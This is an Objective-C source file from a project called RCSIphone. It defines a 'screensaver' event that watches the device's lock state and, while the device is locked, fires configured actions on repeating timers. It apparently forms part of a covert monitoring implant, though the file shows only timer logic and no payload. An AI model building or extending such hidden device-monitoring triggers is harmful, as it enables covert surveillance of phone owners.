//
//  RCSIEventScreensaver.m
//  RCSIphone
//
//  Created by kiodo on 12/03/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RCSIEventScreensaver.h"
#import "RCSIEvents.h"

@implementation RCSIEventScreensaver

@synthesize isDeviceLocked;

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      isDeviceLocked = TRUE;
    }
    
  return  self;
}

- (void)setStartTimer
{
  // do notihing: the timer is inserted in runloop by RCSIEvents processNewEvent
  //              by postSetStartTimer
}

- (void)tryTriggerRepeat:(NSTimer*)aTimer
{
  if (isDeviceLocked == TRUE)
    {
      if ([self isEnabled] == TRUE)
        {
          [[RCSIEvents sharedInstance] triggerAction: [repeat intValue]];
        }
      
      if (currIteration > 0)
        {
          currIteration--;    
          [self setRepeatTimer];
        }  
      else if (currIteration == 0)
        {
          currIteration = (iter == nil ? 0xFFFFFFFF : ([iter intValue] - 1));
          // set to endEndTimer done by setStandByTimer
        }
      else if (currIteration == 0xFFFFFFFF) 
        {
          [self setRepeatTimer];
        }
    }
  else
    {
      currIteration = (iter == nil ? 0xFFFFFFFF : [iter intValue]);
      if (currIteration > 0)
        currIteration--;
      [self setEndTimer];
    }
}

- (void)setStandByTimer
{  
  NSTimeInterval theDelay = 1.00;
  
  if (isDeviceLocked == FALSE)
    {
      currIteration = (iter == nil ? 0xFFFFFFFF : [iter intValue]);
      if (currIteration > 0)
        currIteration--;
      
      [self addTimer:startTimer withDelay: theDelay andSelector:@selector(tryTriggerStart:)];
      isDeviceLocked = TRUE;
    }
  else if (isDeviceLocked == TRUE)
    {
      [self addTimer:endTimer withDelay: theDelay andSelector:@selector(tryTriggerStart:)];
      isDeviceLocked = FALSE;
    }
  return;
}


@end
